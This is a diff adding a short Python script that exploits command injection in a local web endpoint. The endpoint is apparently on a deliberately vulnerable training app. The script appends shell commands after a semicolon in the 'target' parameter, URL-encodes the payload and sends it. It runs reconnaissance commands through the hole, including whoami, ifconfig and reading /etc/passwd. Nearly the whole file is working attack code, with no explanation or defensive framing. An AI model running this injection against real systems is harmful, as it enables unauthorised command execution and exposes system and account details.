@@ -1,0 +1,27 @@
+import requests
+import urllib.parse
+
+base_url = "http://127.0.0.1:4280/vulnerabilities/api/v2/health/connectivity"
+
+def exploit_command_injection(command):
+    payload = f"127.0.0.1; {command}"
+    encoded_payload = urllib.parse.quote(payload)
+    url = f"{base_url}?target={encoded_payload}"
+    
+    response = requests.get(url)
+    
+    # Parse response (assuming output is in response text)
+    print(f"Command: {command}")
+    print(f"Output:\n{response.text}")
+    print("-" * 50)
+
+# Test commands
+commands = [
+    "ls -la",
+    "whoami",
+    "cat /etc/passwd | head -5",
+    "ifconfig"
+]
+
+for cmd in commands:
+    exploit_command_injection(cmd)
